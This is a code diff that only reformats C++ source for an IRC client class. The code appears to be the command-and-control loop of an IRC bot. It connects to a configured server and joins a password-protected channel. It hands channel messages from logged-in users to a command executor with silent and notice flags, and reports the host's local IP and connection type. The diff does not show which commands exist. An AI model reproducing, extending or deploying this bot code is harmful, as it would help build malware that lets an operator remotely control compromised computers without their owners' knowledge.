@@ -13,8 +13,12 @@ IGCSE fInternetGetConnectedStateEx;
 
 CIRC::CIRC() {
 	// Initialize/Clear all variables
-	m_bRunning=true; m_bConnected=false; m_bJoined=false;
-	m_sSocket=INVALID_SOCKET; m_iFailCount=0; m_iServerNum=0;
+    m_bRunning=true;
+    m_bConnected=false;
+    m_bJoined=false;
+    m_sSocket=INVALID_SOCKET;
+    m_iFailCount=0;
+    m_iServerNum=0;
 	m_sLocalHost.Assign(""); // Clear the localhost to prevent crash with servers that don't do userhost
 	m_lLastRecv=GetTickCount();
 
@@ -25,8 +29,12 @@ void *CIRC::Run() {
 	while(m_bRunning && g_cMainCtrl.m_bRunning) {
 		if((m_iServerNum==0 && m_iFailCount>5) || (m_iServerNum!=0 && m_iFailCount>2)) {
 			// Reset CIRC values, disconnect the sockets, and clear the logins
-			m_bJoined=false; m_bConnected=false; if(m_sSocket!=INVALID_SOCKET) xClose(m_sSocket);
-			m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins();
+            m_bJoined=false;
+            m_bConnected=false;
+            if(m_sSocket!=INVALID_SOCKET)
+                xClose(m_sSocket);
+            m_sSocket=INVALID_SOCKET;
+            g_cMainCtrl.m_cMac.ClearLogins();
 
 #ifdef DBGCONSOLE
 			if(!m_iServerNum) // If its the root server, use another text
@@ -57,13 +65,17 @@ void *CIRC::Run() {
 			m_lLastRecv=GetTickCount(); }
 		if(m_sSocket==INVALID_SOCKET) { // We don't have a socket yet, try to create one
 			m_sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-			m_bConnected=false; Sleep(2000);
+            m_bConnected=false;
+            Sleep(2000);
 		} else if(!m_bConnected) { // We're not connected yet, connect to the server
 			// Start IdentD
 			if(!g_cMainCtrl.m_bIdentD_Running && g_cMainCtrl.m_cBot.identd_enabled.bValue)
 				g_cMainCtrl.m_cIdentD.Start();
 			// Setup vars, resolve address
-			sockaddr_in ssin; int iErr; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
+            sockaddr_in ssin;
+            int iErr;
+            memset(&ssin, 0, sizeof(ssin));
+            ssin.sin_family=AF_INET;
 
 #ifdef DBGCONSOLE
 			g_cMainCtrl.m_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Trying to connect to \"%s:%d\"...\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue);
@@ -88,7 +100,9 @@ void *CIRC::Run() {
 #ifdef DBGCONSOLE
 				g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" established!\n", this, g_cMainCtrl.m_cBot.si_server.sValue.CStr(), g_cMainCtrl.m_cBot.si_port.iValue);
 #endif
-				m_bConnected=true; m_bJoined=false; }
+                m_bConnected=true;
+                m_bJoined=false;
+            }
 
 			m_lLastRecv=GetTickCount();
 
@@ -111,10 +125,15 @@ void *CIRC::Run() {
 				m_lLastRecv=GetTickCount(); }
 
 			// Get local ip address
-			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getsockname(m_sSocket, &sa, &sas);
-			char szTemp[64]; sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
+            sockaddr sa;
+            socklen_t sas=sizeof(sa);
+            memset(&sa, 0, sizeof(sa));
+            getsockname(m_sSocket, &sa, &sas);
+            char szTemp[64];
+            sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
 				(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
-			m_sLocalIp.Assign(szTemp); m_lLocalAddr=inet_addr(szTemp);
+            m_sLocalIp.Assign(szTemp);
+            m_lLocalAddr=inet_addr(szTemp);
 
 			// Send the server password
 			if(g_cMainCtrl.m_cBot.si_servpass.sValue.Compare(""))
@@ -124,7 +143,8 @@ void *CIRC::Run() {
 			SendRawFormat("NICK %s\r\nUSER %s 0 0 :%s\r\n", g_cMainCtrl.m_sUserName.CStr(), \
 				g_cMainCtrl.m_sUserName.CStr(), g_cMainCtrl.m_sUserName.CStr());
 		} else {
-			char szLine[8192]; memset(szLine, 0, sizeof(szLine));
+            char szLine[8192];
+            memset(szLine, 0, sizeof(szLine));
 			// Wait for a complete line to be received
 			bool bRecvd=false;
 			if(g_cMainCtrl.m_cBot.si_usessl.bValue)
@@ -132,20 +152,21 @@ void *CIRC::Run() {
 			else
 				bRecvd=recv_line_irc(m_sSocket, szLine, sizeof(szLine), NULL);
 			if(bRecvd) {
-				m_lLastRecv=GetTickCount(); CString sLine(szLine);
+                m_lLastRecv=GetTickCount();
+                CString sLine(szLine);
 #ifdef DBGCONSOLE
 				g_cMainCtrl.m_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Received: \"%s\"\n", this, sLine.CStr());
 #endif
 
 				// Set m_bJoined if we joined the channel
-				if(!sLine.Token(1, " ").Compare("353") && \
-				   !sLine.Token(4, " ").Compare(g_cMainCtrl.m_cBot.si_mainchan.sValue))
+                if(!sLine.Token(1, " ").Compare("353") && !sLine.Token(4, " ").Compare(g_cMainCtrl.m_cBot.si_mainchan.sValue))
 				   m_bJoined=true;
 
 				// Send PONG if we're PING'ed
 				else if(!sLine.Token(0, " ").Compare("PING")) {
 					SendRawFormat("PONG %s\r\n", sLine.Token(1, " ").CStr());
-					if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
+                    if(!m_bJoined)
+                        SendRawFormat("JOIN %s %s\r\n", \
 						g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
 						g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); }
 
@@ -155,7 +176,9 @@ void *CIRC::Run() {
 							SendRawFormat("PONG %s\r\n", sLine.Token(18, " ").CStr());
 						if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
 							g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr(), \
-							g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr()); } }
+                            g_cMainCtrl.m_cBot.si_chanpass.sValue.CStr());
+                    }
+                }
 
 				// Connected to the server, get the hostname
 				else if(!sLine.Token(1, " ").Compare("001") || !sLine.Token(1, " ").Compare("005")) {
@@ -180,17 +203,27 @@ void *CIRC::Run() {
 #ifdef DBGCONSOLE
                     g_cMainCtrl.m_cConsDbg.Log(10, "PRIVMSG: %s\n", sLine.Str());
 #endif
-					CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
+                    CMessage *msg=new CMessage;
+                    CCmdExecutor *ex=new CCmdExecutor;
 					// Check silent and notice parameters, and set bool flags accordingly
-					if(strstr(sLine.CStr(), " -s")) msg->bSilent=true; else msg->bSilent=false;
-					if(strstr(sLine.CStr(), " -n")) msg->bNotice=true; else msg->bNotice=false;
+                    if(strstr(sLine.CStr(), " -s"))
+                        msg->bSilent=true;
+                    else
+                        msg->bSilent=false;
+                    if(strstr(sLine.CStr(), " -n"))
+                        msg->bNotice=true;
+                    else
+                        msg->bNotice=false;
 					// Parse the strings, and insert them into the message
 					msg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
 					msg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
 					msg->sHost.Assign(sLine.Token(1, "@").Token(0, " "));
 					msg->sDest.Assign(sLine.Token(2, " "));
 					char *szText=strstr(sLine.Str(), " :");
-					if(szText) msg->sChatString.Assign(szText+2); else msg->sChatString.Assign("");
+                    if(szText)
+                        msg->sChatString.Assign(szText+2);
+                    else
+                        msg->sChatString.Assign("");
 #ifdef DBGCONSOLE
 					g_cMainCtrl.m_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", \
 						this, msg->sSrc.CStr(), msg->sIdentd.CStr(), msg->sHost.CStr(), \
@@ -198,7 +231,9 @@ void *CIRC::Run() {
 #endif
 					// Let the bot handle it
 					ex->Start();
-					ex->Set(msg); delete msg; }
+                    ex->Set(msg);
+                    delete msg;
+                }
 				
 				// Someone got kicked, maybe the bot itself
 				else if(!sLine.Token(1, " ").Compare("KICK")) {
@@ -222,14 +257,20 @@ void *CIRC::Run() {
 					CString sNewNick(strstr(sLine.Str(), " :"));
 					if(sOldNick.Compare("") && sNewNick.Compare("")) {
 						login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sOldNick);
-						if(pLogin) pLogin->sIRCUsername.Assign(sNewNick);
-						if(!sOldNick.Compare(g_cMainCtrl.m_sUserName)) g_cMainCtrl.m_sUserName.Assign(sNewNick); } }
+                        if(pLogin)
+                            pLogin->sIRCUsername.Assign(sNewNick);
+                        if(!sOldNick.Compare(g_cMainCtrl.m_sUserName))
+                            g_cMainCtrl.m_sUserName.Assign(sNewNick);
+                    }
+                }
 
 				// Someone left the channel
 				else if(!sLine.Token(1, " ").Compare("PART") || !sLine.Token(1, " ").Compare("QUIT")) {
 					// Check if hes logged in, if so, log him out
 					login *pLogin=g_cMainCtrl.m_cMac.FindLogin(sLine.Token(1, ":").Token(0, "!"));
-					if(pLogin) g_cMainCtrl.m_cMac.DelLogin(sLine.Token(1, ":").Token(0, "!"), sLine.Token(1, ":").Token(0, "!")); }
+                    if(pLogin)
+                        g_cMainCtrl.m_cMac.DelLogin(sLine.Token(1, ":").Token(0, "!"), sLine.Token(1, ":").Token(0, "!"));
+                }
 			} else { // We didn't receive a valid line, or the server closed the connection
 				Fail(); continue;
 			}
@@ -309,9 +350,13 @@ bool CIRC::HandleCommand(CMessage *pMsg)
 	return false; }
 
 CString CIRC::NetInfo()
-{	CString sNetInfo; sockaddr sa; socklen_t sas;
+{	CString sNetInfo;
+    sockaddr sa;
+    socklen_t sas;
 	// get ip address
-	sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); getsockname(m_sSocket, &sa, &sas);
+    sas=sizeof(sa);
+    memset(&sa, 0, sizeof(sa));
+    getsockname(m_sSocket, &sa, &sas);
 
 #ifdef WIN32
 	// get connection type/name
@@ -381,8 +426,15 @@ bool CIRC::SendFormat(bool bSilent, bool bNotice, char *szDst, const char *szFmt
 	return SendMsg(bSilent, bNotice, formatbuf, szDst); }
 
 void CIRC::Fail()
-{	Disconnect(); m_iFailCount++; }
+{	Disconnect();
+    m_iFailCount++;
+}
 
 void CIRC::Disconnect()
-{	m_bJoined=false; m_bConnected=false; xClose(m_sSocket);
-	m_sSocket=INVALID_SOCKET; g_cMainCtrl.m_cMac.ClearLogins(); }
+{
+    m_bJoined=false;
+    m_bConnected=false;
+    xClose(m_sSocket);
+    m_sSocket=INVALID_SOCKET;
+    g_cMainCtrl.m_cMac.ClearLogins();
+}
